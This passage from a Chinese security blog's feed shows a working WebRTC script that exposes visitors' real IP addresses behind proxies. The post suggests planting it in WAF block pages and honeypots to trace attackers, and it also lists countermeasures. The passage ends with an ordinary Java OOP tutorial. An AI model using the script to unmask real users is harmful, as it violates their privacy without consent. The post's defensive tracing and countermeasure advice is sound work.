class="line"><span class="language-javascript">                <span class="comment">//bypass naive webrtc blocking using an iframe</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(!<span class="title class_">RTCPeerConnection</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> win = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;rtc_iframe&quot;</span>).<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title class_">RTCPeerConnection</span> = win.<span class="property">RTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                        || win.<span class="property">mozRTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                        || win.<span class="property">msRTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                        || win.<span class="property">webkitRTCPeerConnection</span>;</span></span><br><span class="line"><span class="language-javascript">                    useWebKit = !!win.<span class="property">webkitRTCPeerConnection</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//minimal requirements for data connection</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> mediaConstraints = &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">optional</span>: [&#123;<span class="title class_">RtpDataChannels</span>: <span class="literal">true</span>&#125;]</span></span><br><span class="line"><span class="language-javascript">                &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> servers = &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">iceServers</span>: [</span></span><br><span class="line"><span class="language-javascript">                    &#123;</span></span><br><span class="line"><span class="language-javascript">                      <span class="attr">urls</span>: [</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;stun:stun.l.google.com:19302?transport=udp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;stun:stun1.l.google.com:19302?transport=udp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;stun:stun2.l.google.com:19302?transport=udp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;stun:stun3.l.google.com:19302?transport=udp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;stun:stun4.l.google.com:19302?transport=udp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.ekiga.net?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.ideasip.com?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.rixtelecom.se?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.schlund.de?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.stunprotocol.org:3478?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.voiparound.com?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.voipbuster.com?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.voipstunt.com?transport=udp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&quot;stun:stun.voxgratia.org?transport=udp&quot;</span></span></span><br><span class="line"><span class="language-javascript">                      ]</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                  ]</span></span><br><span class="line"><span class="language-javascript">                &#125;;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//construct a new RTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> pc;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                  pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(servers, mediaConstraints);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">function</span> <span class="title function_">handleCandidate</span>(<span class="params">candidate</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//match just the IP address</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">var</span> ip_regex = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">var</span> ip_addr = ip_regex.<span class="title function_">exec</span>(candidate)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//remove duplicates</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>)</span></span><br><span class="line"><span class="language-javascript">                      <span class="title function_">callback</span>(ip_addr);</span></span><br><span class="line"><span class="language-javascript">                  ip_dups[ip_addr] = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//listen for candidate events</span></span></span><br><span class="line"><span class="language-javascript">                pc.<span class="property">onicecandidate</span> = <span class="keyword">function</span>(<span class="params">ice</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//skip non-candidate events</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">if</span>(ice.<span class="property">candidate</span>)</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">handleCandidate</span>(ice.<span class="property">candidate</span>.<span class="property">candidate</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//create a bogus data channel</span></span></span><br><span class="line"><span class="language-javascript">                pc.<span class="title function_">createDataChannel</span>(<span class="string">&quot;bl&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//create an offer sdp</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                  pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    pc.<span class="title function_">setLocalDescription</span>(result);</span></span><br><span class="line"><span class="language-javascript">                  &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                  pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    pc.<span class="title function_">setLocalDescription</span>(result, <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;, <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;);</span></span><br><span class="line"><span class="language-javascript">                  &#125;, <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//wait for a while to let everything done</span></span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//read candidate info from local description</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> lines = pc.<span class="property">localDescription</span>.<span class="property">sdp</span>.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    lines.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">line</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                      <span class="keyword">if</span>(line.<span class="title function_">indexOf</span>(<span class="string">&#x27;a=candidate:&#x27;</span>) === <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">handleCandidate</span>(line);</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//insert IP addresses into the page</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">getIPs</span>(<span class="keyword">function</span>(<span class="params">ip</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">textContent</span> = ip;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//local IPs</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (ip.<span class="title function_">match</span>(<span class="regexp">/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/</span>))</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;localip&quot;</span>).<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//IPv6 addresses</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">else</span> <span class="keyword">if</span> (ip.<span class="title function_">match</span>(<span class="regexp">/^[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;$/</span>))</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ipv6&quot;</span>).<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//assume the rest are public IPs</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;publicip&quot;</span>).<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// turn 配置</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> config = &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">iceServers</span>: [&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// urls: &quot;stun:stun.l.google.com:19302&quot; // 这里使用谷歌，线上部署直接替换</span></span></span><br><span class="line"><span class="language-javascript">        &#125;]</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 构建</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(config);</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      pc.<span class="property">onicecandidate</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(event.<span class="property">candidate</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">handleCandidate</span>(event.<span class="property">candidate</span>.<span class="property">candidate</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">function</span> <span class="title function_">handleCandidate</span>(<span class="params">candidate</span>) &#123; </span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">if</span> (candidate.<span class="title function_">indexOf</span>(<span class="string">&quot;srflx&quot;</span>) != -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">console</span>.<span class="title function_">log</span>(candidate)</span></span><br><span class="line"><span class="language-javascript">           <span class="keyword">var</span> regex = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/</span></span></span><br><span class="line"><span class="language-javascript">           <span class="keyword">var</span> ip_addr = regex.<span class="title function_">exec</span>(candidate)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">           <span class="title function_">alert</span>(<span class="string">&quot;Your public network ip: &quot;</span>+ ip_addr)</span></span><br><span class="line"><span class="language-javascript">         &#125;  </span></span><br><span class="line"><span class="language-javascript">       &#125;</span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">      pc.<span class="title function_">createDataChannel</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      pc.<span class="title function_">createOffer</span>(<span class="keyword">function</span>(<span class="params">result</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          pc.<span class="title function_">setLocalDescription</span>(result);</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    ok本地部署以下。测试了两种方法代理：</p><ol><li><strong>Chrome 插件 SwitchyOmega</strong></li><li><strong>Clash 开系统代理</strong></li></ol><p>​    文章给出另一种方法：<strong>Proxifier 直接给浏览器进程挂代理</strong></p><p>​    都会访问到真实ip。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074414.jpg"                      alt="image-20220908162823382"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074416.jpg"                      alt="image-20220908162859579"                ></p><p>​    根据medicean师傅的指出需要注意的点</p><ul><li><strong>这玩意儿默认是启用的</strong>（对的没错，包括你现在在看文章用的微信的浏览器）</li><li>那挂个支持 udp 的 socks5 代理行不行？<strong>不行，WebRTC设计之初就是为了点对点通信，毕竟是传流的，压根就不会走代理，懂了啵</strong></li><li>VPN 行不行？<strong>可以</strong></li></ul><p>​    蓝队可能用的点：</p><ol><li><p><strong>WAF 拦截页面埋点</strong>，打点爱用代理是吧？埋在 WAF 拦截后的页面里面，抓到的IP都不是好人</p></li><li><p><strong>往蜜罐里埋</strong></p></li><li><p><strong>可以挖掘一下其它的未被注意到的基于 UDP 协议的功能</strong></p></li></ol><p>​    至于拿到真实 IP 地址之后，回传的问题，可以用 ajax 发 http 包带回去，也可以自己实现一个 WebRTC 服务器，走 udp 来收这部分的数据。除了 WebRTC 服务器之外，像 WebRTC 中用于的 STUN / TURN 服务器，你也可以自己实现一套，反正不让你知道我在哪一步记你就完事。</p><p>​    红队注意的点：</p><p>1、使用插件禁用：WebRTC Leak Prevent</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074419.jpg"                      alt="image-20220908171310192"                ></p><p>2、firefox禁用：Firefox浏览器禁用WebRTC的方法是：在浏览器上输入：<strong>about:config</strong>。之后搜索：<strong>media.peerconnection.enabled</strong>。找到它后双击，将其改成 false 即可。</p><p>3、改用vpn</p><hr><h3 id="。。。"><a href="#。。。" class="headerlink" title="。。。"></a>。。。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;QQ电话真实IP&quot;&gt;&lt;a href=&quot;#QQ电话真实IP&quot; class=&quot;headerlink&quot; title=&quot;QQ电话真实IP&quot;&gt;&lt;/a&gt;QQ电话真实IP&lt;/h3&gt;&lt;p&gt;​    溯源或者鼓捣小玩意时，我们会获取到QQ号，通过QQ电话即可找到对方的真实IP。&lt;/</summary>
      
    
    
    
    <category term="蓝色tips" scheme="http://example.com/categories/%E8%93%9D%E8%89%B2tips/"/>
    
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
    <category term="溯源" scheme="http://example.com/tags/%E6%BA%AF%E6%BA%90/"/>
    
    <category term="QQ" scheme="http://example.com/tags/QQ/"/>
    
    <category term="微信" scheme="http://example.com/tags/%E5%BE%AE%E4%BF%A1/"/>
    
    <category term="IP" scheme="http://example.com/tags/IP/"/>
    
    <category term="EXIF" scheme="http://example.com/tags/EXIF/"/>
    
    <category term="Github" scheme="http://example.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(2)-Java面向对象编程</title>
    <link href="http://example.com/2022/03/19/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-2-Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
    <id>http://example.com/2022/03/19/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-2-Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</id>
    <published>2022-03-19T05:34:17.000Z</published>
    <updated>2023-04-15T15:15:45.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>​    考虑的是标准的模块化设计，使用的时候根据标准进行拼装。面向对象主要有三个特性：封装性，内部操作对外部不可见，内部的操作不可以直接使用时才是安全的；继承性，在已有结构的基础上扩充新功能；多态性，继承性的基础上扩充的概念，指的是类型的转换处理。实际开发中三步：OOA,面向对象分析；OOD,面向对象设计；OOP,面向对象编程。</p><p>​    什么是类：类是对某一类事物的抽象概念；什么是对象：对象描述的是一个具体的产物。具体就是类是模版，对象是实例。类由成员属性和操作方法组成。概念写得很抽象，写点代码就知道了。</p><p>​    产生对象的方法：</p><p>​    1、声明并实例化对象：类名称 对象名称 = new 类名称()</p><p>​    2、分步：</p><p>​            声明对象：类名称 对象名称 = null;</p><p>​            实例化对象：对象名称 = new 类名称();</p><p>​    调用已经实例化对象：</p><p>​            1、对象名称.对象属性</p><p>​            2、对象名称.对象方法()</p><p>​    代码中一定要声明且实例化对象后才可以调用，如果未声明，相当于未在堆内存中开辟所产生问题，只有引用数据（类，接口，数组）类型存在此问题。</p><hr><h4 id="对象内存分析"><a href="#对象内存分析" class="headerlink" title="对象内存分析"></a>对象内存分析</h4><p>​    堆内存：保存的是对象的具体信息，在程序之中堆内存空间的开辟是通过new完成的；栈内存：保存的是一块堆内存的地址。通过地址找到堆内存，再找堆内存里的信息。    </p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073516.jpg"                      alt="内存分析图"                ></p><h4 id="对象引用分析"><a href="#对象引用分析" class="headerlink" title="对象引用分析"></a>对象引用分析</h4><p>​    内存引用传递：同一块堆内存可以被不同的栈内存所指向，也可以更换指向。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">per1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">per1.name = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="type">Person</span> <span class="variable">per2</span> <span class="operator">=</span> per1；<span class="comment">//引用传递</span></span><br><span class="line">per2.name = <span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073517.jpg"                      alt="内存引用传递"                ></p><p>​    引用发生在主方法或者方法之中，修改的都是堆内存中存储的信息，不同的是，程序执行完毕，方法会断开链接。引用传递发生在方法上一定要观察方法的参数类型，也要看方法的执行过程。</p><h4 id="引用垃圾产生简单分析"><a href="#引用垃圾产生简单分析" class="headerlink" title="引用垃圾产生简单分析"></a>引用垃圾产生简单分析</h4><p>​    垃圾空间就是所有的未被栈内存只向的堆内存空间，垃圾空间将会被GC不定期进行回收并且释放内存空间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">per1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Person</span> <span class="variable">per2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">per1.name = <span class="string">&quot;test1&quot;</span>;</span><br><span class="line">per2.name = <span class="string">&quot;test2&quot;</span>;</span><br><span class="line">per2 = per1；</span><br><span class="line">per2.name = <span class="string">&quot;test3&quot;</span><span class="comment">//per1.name也被改为了test3</span></span><br></pre></td></tr></table></figure><p>​    上述per2的堆内存空间即变为垃圾空间。</p><hr><h4 id="成员属性封装"><a href="#成员属性封装" class="headerlink" title="成员属性封装"></a>成员属性封装</h4><p>​    类的组成是属性和方法，方法提供服务，所以一般不会封装。而属性需要较高的安全性，一般对其封装保护（private关键字）。属性一旦封装后外部不可见，对类的内部可见，外部想要访问，按如下方式：</p><p>​    设置或者取得属性可以使用setXXX(),getXXX()方法，private String name为例:设置属性方法:public void setName(String n){};获取属性方法：public String getName(){return name}。</p><p>​    开发中定义类的属性时候，一定要用private封装，并且提供getter，setter方法。</p><hr><h4 id="构造方法与匿名对象"><a href="#构造方法与匿名对象" class="headerlink" title="构造方法与匿名对象"></a>构造方法与匿名对象</h4><p>​    按照上面的方法来看，如果要设置初始化属性，假如说类中的属性有很多个需要设置，那么要调用很多次getter，setter方法。那么就出现了构造方法。可以通过构造方法实现实例化对象中的属性初始化处理（new的时候构造方法）。</p><p>​    构造方法：1、方法名称必须与类名称保持一致；2、构造方法不允许设置任何的返回值类型；3、构造方法是在使用关键字new实例化对象的时候自动调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Class Person&#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String s,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    name = s；</span><br><span class="line">    age = i；</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tell</span><span class="params">()</span>&#123;</span><br><span class="line">    sout(<span class="string">&quot;姓名： &quot;</span>+name+<span class="string">&quot;、年龄： &quot;</span>+ age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  psvm&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;test1&quot;</span>,<span class="number">23</span>);</span><br><span class="line">    per.tell;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    注意：Java中构造方法是类中默认提供的，不写即为无参，编译自动创建，如果有构造方法，默认的构造方法不会创建。对于为什么构造方法不能用void返回，因为Java程序编译器是根据代码结构来进行编译，如果加void，那么与普通方法的代码结构完全一致了，而普通方式是在实例化对象之后才调用的，构造方法是在实例时调用的（new时）。</p><p>​    构造方法也是方法，可以重载。</p><p>​    之前封装属性的时候我们用setter方法，setter和构造方法都具有初始化属性的功能。而setter还具有修改数据的功能。</p><p>​    下面这段代码就是匿名对象了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Class Person&#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String s,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    name = s；</span><br><span class="line">    age = i；</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tell</span><span class="params">()</span>&#123;</span><br><span class="line">    sout(<span class="string">&quot;姓名： &quot;</span>+name+<span class="string">&quot;、年龄： &quot;</span>+ age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  psvm&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">10</span>).tell()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此方法依然可以完成方法的调用，但在使用完后即被释放，垃圾随机会被GC回收。</p><hr><h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h4><p>​    this可实现以下三类结构的描述：</p><p>​    1、当前类中的属性：this.属性；</p><p>​    2、当前类中的方法(普通方法、构造方法)：this()、this.方法名称()；</p><p>​    3、描述当前对象</p><h5 id="1、this调用当前类中属性"><a href="#1、this调用当前类中属性" class="headerlink" title="1、this调用当前类中属性"></a>1、this调用当前类中属性</h5><p>​    我们现在利用构造方法或者是setter方法都可以进行类中属性的赋值，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String n,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">  name = n;</span><br><span class="line">  age = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时构造方法中两个参数的目的是为了类中的name,age赋值，但n和a的参数名称很不好，我们将其修改为name和age</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">  name = name;</span><br><span class="line">  age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    